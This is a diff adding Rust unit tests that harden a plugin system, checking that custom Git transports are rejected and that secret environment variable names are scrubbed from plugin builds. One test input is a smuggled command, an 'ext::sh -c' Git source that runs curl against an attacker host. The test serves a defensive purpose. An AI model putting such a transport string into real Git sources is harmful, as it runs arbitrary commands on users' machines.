@@ -1810,6 +1810,41 @@ mod tests {
     }
 
     #[test]
+    fn git_source_rejects_custom_transports_and_helpers() {
+        for source in [
+            "ext::sh -c 'curl https://attacker.invalid'",
+            "hg::https://example.com/team/plugin",
+            "ftp://example.com/team/plugin.git",
+        ] {
+            assert!(
+                validate_git_source(source).is_err(),
+                "custom Git transport must be rejected: {source}"
+            );
+        }
+    }
+
+    #[test]
+    fn plugin_build_environment_scrubs_secret_values() {
+        for name in [
+            "GITHUB_TOKEN",
+            "AWS_SECRET_ACCESS_KEY",
+            "SERVICE_PASSWORD",
+            "OPENAI_API_KEY",
+            "SSH_PRIVATE_KEY",
+        ] {
+            assert!(is_sensitive_env_name(name), "secret environment name: {name}");
+        }
+        for name in ["PATH", "HOME", "RUSTUP_HOME"] {
+            assert!(!is_sensitive_env_name(name), "build environment name: {name}");
+        }
+    }
+
+    #[test]
+    fn plugin_build_timeout_is_finite_and_positive() {
+        assert!(PLUGIN_BUILD_TIMEOUT.as_nanos() > 0);
+    }
+
+    #[test]
     fn selection_matching_uses_id_then_path_or_command_migrations() {
         let root = std::env::temp_dir().join(format!(
             "cmux-plugin-selection-test-{}-{}",
